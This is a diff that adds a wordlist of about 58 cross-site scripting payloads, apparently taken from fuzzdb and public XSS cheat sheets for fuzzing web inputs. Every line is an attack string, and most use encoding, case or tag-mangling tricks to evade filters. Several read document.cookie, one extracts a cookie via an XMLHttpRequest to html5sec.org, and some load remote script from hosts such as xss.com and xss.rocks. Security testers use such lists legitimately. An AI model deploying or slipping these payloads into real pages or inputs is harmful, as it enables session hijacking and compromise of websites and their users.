@@ -1,0 +1,58 @@
+' onmouseover=alert(/Black.Spook/)
+";eval(unescape(location))//#  %0Aalert(0)
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+"><iframe%20src="http://google.com"%%203E
+"><img src=x onerror=prompt(1);>
+&lt;IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+&lt;SCRIPT SRC=//xss.rocks/.j>
+'); alert('XSS
+"><script>alert(1)</script>
+\";alert('XSS');//
+<%<!--'%><script>alert(1);</script -->
+<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
+<--`<img/src=` onerror=alert(1)> --!>
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<<scr\0ipt/src=http://xss.com/xss.js></script
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<iframe/onreadystatechange=alert(1)
+<iframe/src \/\/onload = prompt(1)
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+<IMG onmouseover="alert('xxs')">
+<img src ?itworksonchrome?\/onerror = alert(1)???
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<img src="/" =_=" title="onerror='prompt(1)'">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&amp;#x09;ascript:alert('XSS');">
+<IMG SRC="jav&amp;#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&amp;#x0D;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<img src="javascript:alert('XSS')">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<img src=`xx:xx`onerror=alert(1)>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<svg/onload=alert(1)
+<svg><script ?>alert(1)
+<svg><script onlypossibleinopera:-)> alert(1)
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
+<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
+<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<var onmouseover="prompt(1)">On Mouse Over</var>?
+http://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe
+http://www.<script>alert(1)</script .com
+https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe
+javascript:alert%28/xss/%29
+javascript:alert(1)
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+x”</title><img src%3dx onerror%3dalert(1)>
+[[#%3Cscript%3Ealert(1)%3C/script%3E|
